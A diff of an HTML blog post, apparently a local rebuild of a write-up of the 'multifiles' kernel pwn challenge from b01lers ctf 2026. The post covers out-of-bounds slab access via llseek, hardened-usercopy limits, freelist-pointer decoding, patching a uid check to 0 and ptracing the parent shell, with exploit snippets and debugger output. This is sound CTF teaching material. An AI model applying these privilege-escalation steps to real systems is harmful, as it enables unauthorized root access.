@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en-US">
 
-<head>
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
   <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -11,7 +11,7 @@
 <meta name="keywords" content="kernel,pwn," />
 
 
-<meta property="og:url" content="https://icctx.xyz/blog/multifiles/">
+<meta property="og:url" content="http://localhost:1313/blog/multifiles/">
 	<meta property="og:site_name" content="icctx">
 	<meta property="og:title" content="b01lers ctf 2026: kernel pwn (part 2)">
 	<meta property="og:description" content="Writeup for kernel pwn challenge from b01lers ctf 2026.">
@@ -37,7 +37,7 @@
 	<meta itemprop="description" content="Writeup for kernel pwn challenge from b01lers ctf 2026.">
 	<meta itemprop="datePublished" content="2026-05-18T00:00:00+00:00">
 	<meta itemprop="dateModified" content="2026-05-18T00:00:00+00:00">
-	<meta itemprop="wordCount" content="5324">
+	<meta itemprop="wordCount" content="4924">
 	<meta itemprop="keywords" content="Kernel,Pwn">
 <meta name="referrer" content="no-referrer-when-downgrade" />
 
@@ -430,7 +430,7 @@
   <h1 id="intro">Intro</h1>
 <p>Previously I wrote a writeup on the first kernel challenge from this CTF — if you haven&rsquo;t read it yet, I recommend starting with <a href="https://icctx.xyz/blog/throughthewall/">Part 1</a>.</p>
 <p>This post covers <strong>multifiles</strong>, the second kernel pwn challenge.</p>
-<p>Since I&rsquo;m releasing this writeup a bit late: in Part 1, to cover all the steps required for exploitation, I reimplemented the exploit from scratch in Rust. This time around, given the delay, you&rsquo;ll get a refactored version of the original exploit in C instead.</p>
+<p>Since I&rsquo;m releasing this a bit late: in Part 1 I reimplemented the exploit from scratch in Rust to cover every step, but this time you&rsquo;ll get a refactored version of the original C exploit instead.</p>
 <h1 id="multifiles">multifiles</h1>
 <p><a href="https://raw.githubusercontent.com/icctx/ctf/refs/heads/main/b01lers.2026/multifiles/multifiles.tar.gz">download</a></p>
 <h2 id="recon">Recon</h2>
@@ -459,14 +459,6 @@
 </span></span><span class="line"><span class="ln">23</span><span class="cl">    └── multifiles.c
 </span></span><span class="line"><span class="ln">24</span><span class="cl">
 </span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="m">4</span> directories, <span class="m">19</span> files
-</span></span></code></pre></div><p>README.md</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Markdown" data-lang="Markdown"><span class="line"><span class="ln">1</span><span class="cl"><span class="gh"># multifiles
-</span></span></span><span class="line"><span class="ln">2</span><span class="cl">
-</span></span><span class="line"><span class="ln">3</span><span class="cl">build artifacts in <span class="sb">`build_out/`</span>
-</span></span><span class="line"><span class="ln">4</span><span class="cl">
-</span></span><span class="line"><span class="ln">5</span><span class="cl">rebuild with <span class="sb">`pwn_build.sh`</span>
-</span></span><span class="line"><span class="ln">6</span><span class="cl">
-</span></span><span class="line"><span class="ln">7</span><span class="cl">run challenge with <span class="sb">`dev.sh`</span>
 </span></span></code></pre></div><p>Based on <code>deploy/wrapper.sh</code>, I assembled a local run script:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln">1</span><span class="cl"><span class="cp">#!/bin/sh
 </span></span></span><span class="line"><span class="ln">2</span><span class="cl">qemu-system-x86_64 <span class="se">\
@@ -493,14 +485,7 @@
 </span></span><span class="line"><span class="ln">14</span><span class="cl">sh: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
 </span></span><span class="line"><span class="ln">15</span><span class="cl">~ $ 
 </span></span></code></pre></div><h2 id="read-sources">Read sources</h2>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln">1</span><span class="cl">src
-</span></span><span class="line"><span class="ln">2</span><span class="cl">├── drop_priv.c
-</span></span><span class="line"><span class="ln">3</span><span class="cl">├── initrd_init
-</span></span><span class="line"><span class="ln">4</span><span class="cl">├── kernel-cache-usercopy.diff
-</span></span><span class="line"><span class="ln">5</span><span class="cl">├── kernel.config.fragment
-</span></span><span class="line"><span class="ln">6</span><span class="cl">├── Makefile
-</span></span><span class="line"><span class="ln">7</span><span class="cl">└── multifiles.c
-</span></span></code></pre></div><p><code>drop_priv</code> and <code>initrd_init</code> follow the same pattern as Part 1.
+<p><code>drop_priv</code> and <code>initrd_init</code> follow the same pattern as Part 1.
 Here we have a target kernel module and a small patch to the kernel itself.</p>
 <p>Let&rsquo;s go through the interesting source files.</p>
 <p><code>kernel-cache-usercopy.diff</code> adds <code>kmem_cache_copy_from_user</code> / <code>kmem_cache_copy_to_user</code> — wrappers around <code>copy_from/to_user</code> that first verify the destination/source object belongs to a specific slab cache before performing the copy:</p>
@@ -643,14 +628,6 @@ CONFIG_SLAB_FREELIST_RANDOM=n
 </span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="nf">vfs_read</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pos</span><span class="p">);</span>         <span class="c1">// -&gt; file-&gt;f_op-&gt;read(file, buf, n, &amp;pos)
 </span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="nf">file_pos_write</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">pos</span><span class="p">);</span>            <span class="c1">// write the (advanced) position back
 </span></span></span></code></pre></div><p>So the <code>loff_t *offset</code> argument handed to the driver is a pointer to a copy of <code>file-&gt;f_pos</code>, and after the op the kernel writes it back (which is why a normal <code>read</code> advances the position). <code>multifiles_llseek</code> sets <code>file-&gt;f_pos</code> directly. Net effect: <code>lseek()</code> followed by <code>read()</code>/<code>write()</code> lets us pick exactly where the driver&rsquo;s copy starts — including the OOB window <code>[0x80, 0x9f]</code>.</p>
-<blockquote>
-<p><strong>Further reading — VFS <code>f_pos</code> / <code>llseek</code>:</strong></p>
-<ul>
-<li><a href="https://www.kernel.org/doc/html/latest/filesystems/vfs.html">Linux kernel docs — VFS, <code>struct file_operations</code></a> (the <code>llseek</code>/<code>read</code>/<code>write</code> contracts)</li>
-<li><a href="https://man7.org/linux/man-pages/man2/lseek.2.html"><code>lseek(2)</code> man page</a> (userspace semantics, <code>SEEK_SET</code>)</li>
-<li><a href="https://elixir.bootlin.com/linux/latest/source/fs/read_write.c"><code>fs/read_write.c</code> on Bootlin Elixir</a> — read <code>ksys_read</code>, <code>file_pos_read</code>/<code>file_pos_write</code>, <code>vfs_read</code>, <code>generic_file_llseek</code> to see how <code>f_pos</code> flows into <code>*offset</code></li>
-</ul>
-</blockquote>
 <h2 id="primitives">Primitives</h2>
 <p><strong>Controlled OOB read/write:</strong>
 By setting <code>f_pos</code> via <code>llseek</code> to a value in <code>[0x80, 0x9f]</code>, <code>read()</code>/<code>write()</code> will copy from/to <code>obj+0x20+offset</code>, which lands in the next adjacent slab object. Up to 64 bytes (<code>MAX_RW_SIZE</code>) per operation, 8-byte aligned (<code>count % sizeof(u64) == 0</code>).</p>
@@ -696,45 +673,22 @@ is exactly the <code>f_pos</code> the driver will use as its copy offset.</p>
 </span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p><code>multifiles_set_active</code> is <code>static</code> and gets inlined into <code>multifiles_ioctl</code>, so there is no standalone symbol to break on. Set a breakpoint at <code>multifiles_ioctl</code> (<code>.text+0x2f0</code>) and step into the <code>SET_ACTIVE</code> branch from the switch.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln"> 1</span><span class="cl">gef&gt; x/16gx <span class="nv">$r12</span>+0x20
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln"> 1</span><span class="cl">gef&gt; x/4gx <span class="nv">$r12</span>+0x20      <span class="c1"># MultiFileList-&gt;files[]: three objects, 0xa0 apart</span>
 </span></span><span class="line"><span class="ln"> 2</span><span class="cl">0xffff8880038d7020:     0xffff888003989000      0xffff8880039890a0
 </span></span><span class="line"><span class="ln"> 3</span><span class="cl">0xffff8880038d7030:     0xffff888003989140      0x0000000000000000
-</span></span><span class="line"><span class="ln"> 4</span><span class="cl">0xffff8880038d7040:     0x0000000000000000      0x0000000000000000
-</span></span><span class="line"><span class="ln"> 5</span><span class="cl">0xffff8880038d7050:     0x0000000000000000      0x0000000000000000
-</span></span><span class="line"><span class="ln"> 6</span><span class="cl">0xffff8880038d7060:     0x0000000000000000      0x0000000000000000
-</span></span><span class="line"><span class="ln"> 7</span><span class="cl">0xffff8880038d7070:     0x0000000000000000      0x0000000000000000
-</span></span><span class="line"><span class="ln"> 8</span><span class="cl">0xffff8880038d7080:     0x0000000000000000      0x0000000000000000
-</span></span><span class="line"><span class="ln"> 9</span><span class="cl">0xffff8880038d7090:     0x0000000000000000      0x0000000000000000
-</span></span><span class="line"><span class="ln">10</span><span class="cl">gef&gt; telescope *<span class="o">(</span>void**<span class="o">)(</span><span class="nv">$r12</span>+0x20<span class="o">)</span> -n
-</span></span><span class="line"><span class="ln">11</span><span class="cl">      0xffff888003989000<span class="p">|</span>+0x0000<span class="p">|</span>+000: 0x0000000000000001
-</span></span><span class="line"><span class="ln">12</span><span class="cl">      0xffff888003989008<span class="p">|</span>+0x0008<span class="p">|</span>+001: 0x7d333a7b66746362 <span class="s1">&#39;bctf{:3}a0&#39;</span>
-</span></span><span class="line"><span class="ln">13</span><span class="cl">      0xffff888003989010<span class="p">|</span>+0x0010<span class="p">|</span>+002: 0x0000000000003061 <span class="o">(</span><span class="s1">&#39;a0&#39;</span>?<span class="o">)</span>
-</span></span><span class="line"><span class="ln">14</span><span class="cl">      0xffff888003989018<span class="p">|</span>+0x0018<span class="p">|</span>+003: 0x0000000000000000
-</span></span><span class="line"><span class="ln">15</span><span class="cl">      0xffff888003989020<span class="p">|</span>+0x0020<span class="p">|</span>+004: 0x0000000000000000
-</span></span><span class="line"><span class="ln">16</span><span class="cl">      0xffff888003989028<span class="p">|</span>+0x0028<span class="p">|</span>+005: 0x0000000000000000
-</span></span><span class="line"><span class="ln">17</span><span class="cl">      0xffff888003989030<span class="p">|</span>+0x0030<span class="p">|</span>+006: 0x0000000000000000
-</span></span><span class="line"><span class="ln">18</span><span class="cl">      0xffff888003989038<span class="p">|</span>+0x0038<span class="p">|</span>+007: 0x0000000000000000
-</span></span><span class="line"><span class="ln">19</span><span class="cl">      0xffff888003989040<span class="p">|</span>+0x0040<span class="p">|</span>+008: 0x0000000000000000
-</span></span><span class="line"><span class="ln">20</span><span class="cl">      0xffff888003989048<span class="p">|</span>+0x0048<span class="p">|</span>+009: 0x0000000000000000
-</span></span><span class="line"><span class="ln">21</span><span class="cl">      0xffff888003989050<span class="p">|</span>+0x0050<span class="p">|</span>+010: 0x0000000000000000
-</span></span><span class="line"><span class="ln">22</span><span class="cl">      0xffff888003989058<span class="p">|</span>+0x0058<span class="p">|</span>+011: 0x0000000000000000
-</span></span><span class="line"><span class="ln">23</span><span class="cl">      0xffff888003989060<span class="p">|</span>+0x0060<span class="p">|</span>+012: 0x0000000000000000
-</span></span><span class="line"><span class="ln">24</span><span class="cl">      0xffff888003989068<span class="p">|</span>+0x0068<span class="p">|</span>+013: 0x0000000000000000
-</span></span><span class="line"><span class="ln">25</span><span class="cl">      0xffff888003989070<span class="p">|</span>+0x0070<span class="p">|</span>+014: 0x0000000000000000
-</span></span><span class="line"><span class="ln">26</span><span class="cl">      0xffff888003989078<span class="p">|</span>+0x0078<span class="p">|</span>+015: 0x0000000000000000
-</span></span><span class="line"><span class="ln">27</span><span class="cl">      0xffff888003989080<span class="p">|</span>+0x0080<span class="p">|</span>+016: 0x0000000000000000
-</span></span><span class="line"><span class="ln">28</span><span class="cl">      0xffff888003989088<span class="p">|</span>+0x0088<span class="p">|</span>+017: 0x0000000000000000
-</span></span><span class="line"><span class="ln">29</span><span class="cl">      0xffff888003989090<span class="p">|</span>+0x0090<span class="p">|</span>+018: 0x0000000000000000
-</span></span><span class="line"><span class="ln">30</span><span class="cl">      0xffff888003989098<span class="p">|</span>+0x0098<span class="p">|</span>+019: 0x0000000000000000
-</span></span><span class="line"><span class="ln">31</span><span class="cl">      0xffff8880039890a0<span class="p">|</span>+0x00a0<span class="p">|</span>+020: 0x0000000000000001
-</span></span><span class="line"><span class="ln">32</span><span class="cl">      0xffff8880039890a8<span class="p">|</span>+0x00a8<span class="p">|</span>+021: 0x7d333a7b66746362 <span class="s1">&#39;bctf{:3}a1&#39;</span>
-</span></span><span class="line"><span class="ln">33</span><span class="cl">      0xffff8880039890b0<span class="p">|</span>+0x00b0<span class="p">|</span>+022: 0x0000000000003161 <span class="o">(</span><span class="s1">&#39;a1&#39;</span>?<span class="o">)</span>
-</span></span><span class="line"><span class="ln">34</span><span class="cl">      0xffff8880039890b8<span class="p">|</span>+0x00b8<span class="p">|</span>+023: 0x0000000000000000
-</span></span><span class="line"><span class="ln">35</span><span class="cl">      ...
-</span></span><span class="line"><span class="ln">36</span><span class="cl">      0xffff888003989140<span class="p">|</span>+0x0140<span class="p">|</span>+040: 0x0000000000000001
-</span></span><span class="line"><span class="ln">37</span><span class="cl">      0xffff888003989148<span class="p">|</span>+0x0148<span class="p">|</span>+041: 0x7d333a7b66746362 <span class="s1">&#39;bctf{:3}a2&#39;</span>
-</span></span><span class="line"><span class="ln">38</span><span class="cl">      0xffff888003989150<span class="p">|</span>+0x0150<span class="p">|</span>+042: 0x0000000000003261 <span class="o">(</span><span class="s1">&#39;a2&#39;</span>?<span class="o">)</span>
-</span></span><span class="line"><span class="ln">39</span><span class="cl">      ...
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">gef&gt; telescope *<span class="o">(</span>void**<span class="o">)(</span><span class="nv">$r12</span>+0x20<span class="o">)</span> -n
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      0xffff888003989000<span class="p">|</span>+0x0000<span class="p">|</span>+000: 0x0000000000000001
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">      0xffff888003989008<span class="p">|</span>+0x0008<span class="p">|</span>+001: 0x7d333a7b66746362 <span class="s1">&#39;bctf{:3}a0&#39;</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">      0xffff888003989010<span class="p">|</span>+0x0010<span class="p">|</span>+002: 0x0000000000003061 <span class="o">(</span><span class="s1">&#39;a0&#39;</span>?<span class="o">)</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">      ...
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">      0xffff8880039890a0<span class="p">|</span>+0x00a0<span class="p">|</span>+020: 0x0000000000000001
+</span></span><span class="line"><span class="ln">10</span><span class="cl">      0xffff8880039890a8<span class="p">|</span>+0x00a8<span class="p">|</span>+021: 0x7d333a7b66746362 <span class="s1">&#39;bctf{:3}a1&#39;</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">      0xffff8880039890b0<span class="p">|</span>+0x00b0<span class="p">|</span>+022: 0x0000000000003161 <span class="o">(</span><span class="s1">&#39;a1&#39;</span>?<span class="o">)</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">      ...
+</span></span><span class="line"><span class="ln">13</span><span class="cl">      0xffff888003989140<span class="p">|</span>+0x0140<span class="p">|</span>+040: 0x0000000000000001
+</span></span><span class="line"><span class="ln">14</span><span class="cl">      0xffff888003989148<span class="p">|</span>+0x0148<span class="p">|</span>+041: 0x7d333a7b66746362 <span class="s1">&#39;bctf{:3}a2&#39;</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">      0xffff888003989150<span class="p">|</span>+0x0150<span class="p">|</span>+042: 0x0000000000003261 <span class="o">(</span><span class="s1">&#39;a2&#39;</span>?<span class="o">)</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">      ...
 </span></span></code></pre></div><h3 id="leaking-the-flag--and-the-hardened-usercopy-wall">Leaking the flag — and the hardened usercopy wall</h3>
 <p>The obvious first target is that <code>bctf{:3}</code> canary in <code>flags</code>. A freshly created neighbor has <code>flags</code> at offset <code>0x08</code>, so let&rsquo;s point the OOB read at the neighbor&rsquo;s header: <code>f_pos=0x80</code> makes the copy start at <code>obj+0xa0</code> = the neighbor&rsquo;s offset <code>0</code>, which would put its <code>flags</code> in <code>leak[1]</code>.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="ln">1</span><span class="cl"><span class="kt">uint8_t</span> <span class="n">leak</span><span class="p">[</span><span class="mh">0x40</span><span class="p">];</span>
@@ -743,39 +697,16 @@ is exactly the <code>f_pos</code> the driver will use as its copy offset.</p>
 </span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] neighbor flags = 0x%llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">leak</span> <span class="o">+</span> <span class="mi">8</span><span class="p">));</span>
 </span></span></code></pre></div><p>Running it instantly panics:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">[</span>   12.567074<span class="o">]</span> usercopy: Kernel memory exposure attempt detected from SLUB object <span class="s1">&#39;multifiles_cache&#39;</span> <span class="o">(</span>offset 0, size 64<span class="o">)</span>!
-</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="o">[</span>   12.568138<span class="o">]</span> ------------<span class="o">[</span> cut here <span class="o">]</span>------------
-</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="o">[</span>   12.568300<span class="o">]</span> kernel BUG at mm/usercopy.c:102!
-</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="o">[</span>   12.569592<span class="o">]</span> Oops: invalid opcode: <span class="m">0000</span> <span class="o">[</span><span class="c1">#1] PREEMPT SMP PTI</span>
-</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="o">[</span>   12.570619<span class="o">]</span> CPU: <span class="m">0</span> UID: <span class="m">1000</span> PID: <span class="m">54</span> Comm: w Tainted: G           O       6.12.81-dirty <span class="c1">#1</span>
-</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="o">[</span>   12.571082<span class="o">]</span> Tainted: <span class="o">[</span>O<span class="o">]=</span>OOT_MODULE
-</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="o">[</span>   12.571198<span class="o">]</span> Hardware name: QEMU Standard PC <span class="o">(</span>i440FX + PIIX, 1996<span class="o">)</span>, BIOS 1.17.0-10.fc44 06/10/2025
-</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="o">[</span>   12.571507<span class="o">]</span> RIP: 0010:usercopy_abort+0x68/0x80
-</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="o">[</span>   12.572341<span class="o">]</span> Code: ac <span class="m">51</span> <span class="m">48</span> c7 c2 <span class="m">48</span> b3 <span class="m">97</span> ac <span class="m">41</span> <span class="m">52</span> <span class="m">48</span> c7 c7 <span class="m">58</span> 2d 9c ac <span class="m">48</span> 0f <span class="m">45</span> d6 <span class="m">48</span> c7 c6 <span class="m">45</span> <span class="m">09</span> <span class="m">96</span> ac <span class="m">48</span> <span class="m">89</span> c1 <span class="m">49</span> 0f <span class="m">45</span> f3 e8 f9 <span class="m">27</span> e9 ff <span class="m">90</span> &lt;0f&gt; 0b <span class="m">49</span> c7 c1 f8 f4 <span class="m">99</span> ac 4d <span class="m">89</span> ca 4d <span class="m">89</span> c8 eb a7 0f 1f <span class="m">80</span> <span class="m">00</span> <span class="m">00</span>
-</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="o">[</span>   12.572840<span class="o">]</span> RSP: 0018:ffffb6d740173dd0 EFLAGS: <span class="m">00010246</span>
-</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="o">[</span>   12.573072<span class="o">]</span> RAX: 000000000000006a RBX: ffffa01ac19ba0a0 RCX: 00000000ffffdfff
-</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="o">[</span>   12.573194<span class="o">]</span> RDX: <span class="m">0000000000000000</span> RSI: ffffb6d740173c88 RDI: <span class="m">0000000000000001</span>
-</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="o">[</span>   12.573337<span class="o">]</span> RBP: <span class="m">0000000000000040</span> R08: 0000000000009ffb R09: 00000000ffffdfff
-</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="o">[</span>   12.573559<span class="o">]</span> R10: 00000000ffffdfff R11: ffffffffacc555e0 R12: <span class="m">0000000000000001</span>
-</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="o">[</span>   12.573675<span class="o">]</span> R13: ffffa01ac19ba0e0 R14: fffffffffffffff2 R15: ffffb6d740173f08
-</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="o">[</span>   12.573815<span class="o">]</span> FS:  0000000000409cb8<span class="o">(</span>0000<span class="o">)</span> GS:ffffa01acf800000<span class="o">(</span>0000<span class="o">)</span> knlGS:0000000000000000
-</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="o">[</span>   12.573935<span class="o">]</span> CS:  <span class="m">0010</span> DS: <span class="m">0000</span> ES: <span class="m">0000</span> CR0: <span class="m">0000000080050033</span>
-</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="o">[</span>   12.574026<span class="o">]</span> CR2: 000000000040601a CR3: 00000000019a4000 CR4: 00000000003006f0
-</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="o">[</span>   12.574242<span class="o">]</span> Call Trace:
-</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="o">[</span>   12.575178<span class="o">]</span>  &lt;TASK&gt;
-</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="o">[</span>   12.575606<span class="o">]</span>  __check_heap_object+0x7d/0xa0
-</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="o">[</span>   12.575858<span class="o">]</span>  __check_object_size+0x166/0x2b0
-</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="o">[</span>   12.575983<span class="o">]</span>  kmem_cache_copy_to_user+0x85/0xe0
-</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="o">[</span>   12.576196<span class="o">]</span>  multifiles_read+0xa6/0xc0 <span class="o">[</span>multifiles<span class="o">]</span>
-</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="o">[</span>   12.576675<span class="o">]</span>  vfs_read+0xda/0x350
-</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="o">[</span>   12.576795<span class="o">]</span>  ksys_read+0x6a/0xf0
-</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="o">[</span>   12.576868<span class="o">]</span>  do_syscall_64+0x9e/0x1a0
-</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="o">[</span>   12.577066<span class="o">]</span>  entry_SYSCALL_64_after_hwframe+0x77/0x7f
-</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="o">[</span>   12.577338<span class="o">]</span> RIP: 0033:0x4042b0
-</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="o">[</span>   12.578697<span class="o">]</span>  &lt;/TASK&gt;
-</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="o">[</span>   12.578775<span class="o">]</span> Modules linked in: multifiles<span class="o">(</span>O<span class="o">)</span>
-</span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="o">[</span>   12.579623<span class="o">]</span> ---<span class="o">[</span> end trace <span class="m">0000000000000000</span> <span class="o">]</span>---
-</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="o">[</span>   12.581620<span class="o">]</span> Kernel panic - not syncing: Fatal exception
-</span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="o">[</span>   12.582376<span class="o">]</span> Kernel Offset: 0x2aa00000 from 0xffffffff81000000 <span class="o">(</span>relocation range: 0xffffffff80000000-0xffffffffbfffffff<span class="o">)</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="o">[</span>   12.568300<span class="o">]</span> kernel BUG at mm/usercopy.c:102!
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="o">[</span>   12.571507<span class="o">]</span> RIP: 0010:usercopy_abort+0x68/0x80
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="o">[</span>   12.574242<span class="o">]</span> Call Trace:
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="o">[</span>   12.575606<span class="o">]</span>  __check_heap_object+0x7d/0xa0
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="o">[</span>   12.575858<span class="o">]</span>  __check_object_size+0x166/0x2b0
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="o">[</span>   12.575983<span class="o">]</span>  kmem_cache_copy_to_user+0x85/0xe0
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="o">[</span>   12.576196<span class="o">]</span>  multifiles_read+0xa6/0xc0 <span class="o">[</span>multifiles<span class="o">]</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="o">[</span>   12.576675<span class="o">]</span>  vfs_read+0xda/0x350
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="o">[</span>   12.576868<span class="o">]</span>  do_syscall_64+0x9e/0x1a0
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="o">[</span>   12.581620<span class="o">]</span> Kernel panic - not syncing: Fatal exception
 </span></span></code></pre></div><p>This is hardened usercopy. Recall the cache is created with <code>kmem_cache_create_usercopy(..., offsetof(MultiFile, name), USERCOPY_SIZE, ...)</code> — useroffset <code>0x10</code>, usersize <code>0x90</code>. Only <code>[obj+0x10, obj+0xa0)</code> (<code>name</code> + <code>data</code>) is allowed to cross the user boundary. <code>__check_object_size</code> figures out which slab object our source pointer lands in (the neighbor) and checks the range against <em>its</em> usercopy region. Our copy started at <code>neighbor+0x00</code>, below <code>0x10</code>, so it aborts — &ldquo;offset 0, size 64&rdquo;.</p>
 <p>The takeaway is a hard constraint on the primitive: the OOB copy must start at <code>neighbor+0x10</code> or later, i.e. <strong><code>f_pos &gt;= 0x90</code></strong>. The header — <code>type</code>, <code>flags</code>, and (once the object is freed) the freelist pointer at offset <code>0</code> — is all unreachable this way. So the <code>bctf{:3}</code> canary cannot be leaked directly; it lives in the header precisely so hardened usercopy guards it.</p>
 <p>Pointing the read at the neighbor&rsquo;s <code>name</code> instead works cleanly (<code>f_pos=0x90</code> → start <code>obj+0xb0</code> = <code>neighbor+0x10</code>):</p>
@@ -855,7 +786,7 @@ is exactly the <code>f_pos</code> the driver will use as its copy offset.</p>
 <h4 id="two-cancellations">Two cancellations</h4>
 <ol>
 <li><strong>XOR two words to cancel <code>random</code>.</strong> It&rsquo;s one per-cache constant, so <code>E(A) ^ E(B)</code> drops it.</li>
-<li><strong>Same-page bswap cancels the page base.</strong> <code>bswap64(a) ^ bswap64(b) = bswap64(a ^ b)</code>, and for two freeptr slots on the same 4K page <code>a ^ b</code> is just the low-bits <em>delta</em> — the page base is identical in both and cancels. We don&rsquo;t know the address, but we know the <em>&ldquo;distance&rdquo;</em>.</li>
+<li><strong>Same-page bswap cancels the page base.</strong> <code>bswap64(a) ^ bswap64(b) = bswap64(a ^ b)</code>, and for two freeptr slots on the same 4K page <code>a ^ b</code> is just the low-bits <em>delta</em> — the page base is identical in both and cancels. We don&rsquo;t know the address, but we know the <em>distance</em>.</li>
 </ol>
 <h4 id="layout">Layout</h4>
 <p><code>0x1000 / 0xa0 = 25</code> objects per page (<code>0x60</code> tail padding). On a pristine page allocations climb by address, so <code>O_i = page + i*0xa0</code>. We use three of them:</p>
@@ -948,7 +879,7 @@ free 20:  next(O_20) = O_22
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="ln">1</span><span class="cl"><span class="nf">patch_drop_priv_fd</span><span class="p">(</span><span class="n">target_fd</span><span class="p">,</span> <span class="n">poff</span><span class="p">,</span> <span class="n">npoff</span><span class="p">);</span>   <span class="c1">// pwrite 0x00000000 over each 0x000003e8
 </span></span></span></code></pre></div><p>Then the handoff. The initrd&rsquo;s <code>init</code> is an infinite <code>while true; do /bin/drop_priv; done</code>, so we just need the current (uid 1000) shell to exit and the loop re-runs the patched binary. We <code>ptrace</code> the parent shell and rewrite its registers to <code>exit_group(0)</code>, pointing <code>rip</code> at a <code>syscall; ret</code> in its vDSO:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="ln">1</span><span class="cl"><span class="nf">make_parent_exit_zero</span><span class="p">();</span>   <span class="c1">// ATTACH parent; rax=__NR_exit_group, rdi=0, rip=vdso syscall;ret
-</span></span></span></code></pre></div><p>This needs no privileges, which surprised me at first. At this point we&rsquo;re still uid 1000 and so is the parent shell, and same-uid <code>ptrace</code> is unprivileged — you only need <code>CAP_SYS_PTRACE</code> to attach across a privilege boundary. On top of that this kernel ships without Yama (<code>CONFIG_SECURITY_YAMA</code> is unset), so there&rsquo;s no <code>ptrace_scope</code> to forbid attaching to an ancestor. If it ever did fail, poking <code>exit</code> into the tty with <code>TIOCSTI</code> or just <code>kill</code>ing the shell would do the same job.</p>
